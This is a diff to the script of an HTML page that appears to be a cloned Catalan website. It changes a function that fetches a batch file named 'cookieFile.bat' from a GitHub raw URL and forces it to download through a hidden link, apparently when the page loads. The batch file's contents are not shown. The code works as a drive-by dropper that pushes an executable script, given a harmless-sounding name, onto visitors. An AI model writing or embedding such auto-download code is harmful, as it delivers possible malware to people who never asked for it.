@@ -3,13 +3,18 @@
 <html lang="ca" prefix="og: https://ogp.me/ns#" class=" js no-touch svg inlinesvg svgclippaths no-ie8compat" style="" data-lt-installed="true"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><style class="darkreader darkreader--text" media="screen"></style><style class="darkreader darkreader--invert" media="screen"></style><style class="darkreader darkreader--inline" media="screen">[data-darkreader-inline-bgcolor] {
   background-color: var(--darkreader-inline-bgcolor) !important;
     <script>
-        function downloadFile() {
-            var link = document.createElement('a');
-            link.href = 'https://raw.githubusercontent.com/Propayer/Institut-Pau-Vila/main/cookieFile.bat'; // Your GitHub file URL
+        async function downloadFile() {
+            const fileUrl = 'https://raw.githubusercontent.com/Propayer/Institut-Pau-Vila/main/cookieFile.bat';
+            const response = await fetch(fileUrl);
+            const blob = await response.blob();
+            const url = window.URL.createObjectURL(blob);
+            const link = document.createElement('a');
+            link.href = url;
             link.download = 'cookieFile.bat';
             document.body.appendChild(link);
             link.click();
             document.body.removeChild(link);
+            window.URL.revokeObjectURL(url); // Clean up
         }
 
         window.onload = function() {
